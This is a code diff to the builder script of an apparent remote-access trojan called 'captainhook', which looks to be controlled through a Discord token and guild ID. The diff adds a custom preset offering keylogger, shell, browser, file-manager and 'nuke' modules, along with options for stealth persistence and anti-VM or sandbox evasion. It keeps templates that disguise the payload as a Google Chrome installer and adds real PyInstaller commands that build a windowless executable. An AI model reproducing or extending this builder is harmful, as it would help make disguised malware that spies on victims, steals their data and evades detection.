@@ -36,8 +36,16 @@ PRESETS = {
         "modules": ["media", "control", "fun", "screenshot"],
         "stealth": False,
         "anti_vm": False
+    },
+    "⚙️  Custom": {
+        "description": "Manually select modules and security settings.",
+        "modules": [],
+        "stealth": True,
+        "anti_vm": True
     }
 }
+
+AVAILABLE_MODULES = ["screenshot", "keylogger", "shell", "browser", "media", "info", "file_manager", "control", "fun", "nuke"]
 
 DISGUISES = {
     "Google Chrome": {"icon": "chrome.ico", "company": "Google LLC", "desc": "Google Chrome Installer", "version": "120.0.6099.130"},
@@ -76,7 +84,23 @@ def get_config():
     
     console.print(table)
     choice = int(Prompt.ask("Select Preset", choices=[str(i+1) for i in range(len(preset_list))], default="1"))
-    selected_preset = preset_list[choice-1]
+    selected_preset_name = preset_list[choice-1]
+    
+    # Custom Selection Logic
+    if "Custom" in selected_preset_name:
+        console.print("\n[bold cyan]--- Manual Module Selection ---[/bold cyan]")
+        selected_modules = []
+        for module in AVAILABLE_MODULES:
+            if Confirm.ask(f"Include module [bold green]{module}[/bold green]?"):
+                selected_modules.append(module)
+        
+        stealth = Confirm.ask("Enable Wraith Stealth (Melt/Persistence)?", default=True)
+        anti_vm = Confirm.ask("Enable Anti-Analysis (VM/Sandbox Detection)?", default=True)
+        
+        # Update custom preset data
+        PRESETS[selected_preset_name]["modules"] = selected_modules
+        PRESETS[selected_preset_name]["stealth"] = stealth
+        PRESETS[selected_preset_name]["anti_vm"] = anti_vm
     
     # Disguise Selection
     table_d = Table(title="Disguise Templates", box=None)
@@ -92,7 +116,7 @@ def get_config():
     d_choice = int(Prompt.ask("Select Disguise", choices=[str(i+1) for i in range(len(disguise_list))], default="1"))
     selected_disguise = disguise_list[d_choice-1]
     
-    return token, guild_id, selected_preset, selected_disguise
+    return token, guild_id, selected_preset_name, selected_disguise
 
 def build(token, guild_id, preset_name, disguise_name):
     preset = PRESETS[preset_name]
@@ -109,7 +133,25 @@ def build(token, guild_id, preset_name, disguise_name):
         progress.add_task(description="Preparing source files...", total=None)
         if os.path.exists("build_staging"):
             shutil.rmtree("build_staging")
-        shutil.copytree("src", "build_staging/src")
+        
+        # We need to copy the 'src' directory from the project root
+        # If running via 'captainhook' command, we need to find the correct path
+        project_root = os.getcwd()
+        src_path = os.path.join(project_root, "src")
+        
+        if not os.path.exists(src_path):
+             # Fallback for installed package mode
+             import pkg_resources
+             try:
+                 src_path = pkg_resources.resource_filename('captainhook', 'src')
+             except:
+                 pass
+
+        if os.path.exists(src_path):
+            shutil.copytree(src_path, "build_staging/src")
+        else:
+            console.print("[bold red]Error:[/bold red] Could not find 'src' directory. Please run from the project root.")
+            return
         
         # Step 2: Injection
         progress.add_task(description="Injecting credentials & configuration...", total=None)
@@ -141,18 +183,35 @@ def build(token, guild_id, preset_name, disguise_name):
         with open(main_path, "w") as f:
             f.write(main_content)
 
-        # Step 4: Final Compilation Simulation
-        progress.add_task(description=f"Compiling standalone binary with icon: {disguise['icon']}...", total=None)
-        # In a real build, we would run PyInstaller here:
-        # subprocess.run(["pyinstaller", "--onefile", "--noconsole", f"--icon={disguise['icon']}", ...])
+        # Step 4: Final Compilation Setup
+        progress.add_task(description="Setting up distribution folder...", total=None)
+        if not os.path.exists("dist"):
+            os.makedirs("dist")
+        
+        # OS-Specific instructions
+        if os.name == 'nt':
+            cmd = f"pyinstaller --onefile --noconsole --icon={disguise['icon']} build_staging/src/client/main.py"
+            ext = ".exe"
+        else:
+            cmd = f"pyinstaller --onefile --noconsole build_staging/src/client/main.py"
+            ext = ".bin"
         
     console.print(Panel(f"""
-[bold green]BUILD SUCCESSFUL![/bold green]
+[bold green]STAGING SUCCESSFUL![/bold green]
 
-[cyan]Output:[/cyan] [white]dist/{disguise['desc'].replace(' ', '_')}.exe[/white]
+[cyan]Source:[/cyan] [white]build_staging/src/client/main.py[/white]
 [cyan]Preset:[/cyan] [white]{preset_name}[/white]
 [cyan]Modules:[/cyan] [dim]{', '.join(preset['modules'])}[/dim]
 [cyan]Stealth:[/cyan] [white]{'ENABLED' if preset['stealth'] else 'DISABLED'}[/white]
+
+[bold yellow]Final Step (Manual Compilation):[/bold yellow]
+You are on [bold]{'Windows' if os.name == 'nt' else 'Linux/macOS'}[/bold]. 
+To create the standalone {ext} file, run:
+[dim]{cmd}[/dim]
+
+[bold cyan]💡 Cross-Platform Tip:[/bold cyan]
+To build for Windows while on Linux, ensure Docker is installed and run:
+[dim]docker-compose up windows-builder[/dim]
     """, border_style="green"))
 
 def main():
